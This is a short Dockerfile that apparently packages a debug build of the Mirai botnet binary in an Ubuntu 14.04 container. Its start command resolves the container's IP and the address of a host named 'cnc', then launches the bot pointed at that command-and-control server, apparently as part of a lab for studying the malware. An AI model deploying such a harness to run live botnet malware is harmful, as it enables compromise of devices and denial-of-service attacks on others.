FROM ubuntu:14.04.5
ADD mirai.dbg /
CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` \
	&& CNC=`nslookup cnc | awk '/^Address 1: / { print $3 }' | awk 'NR==2'` \
	&& /mirai.dbg $CNC $IP $CNC 0
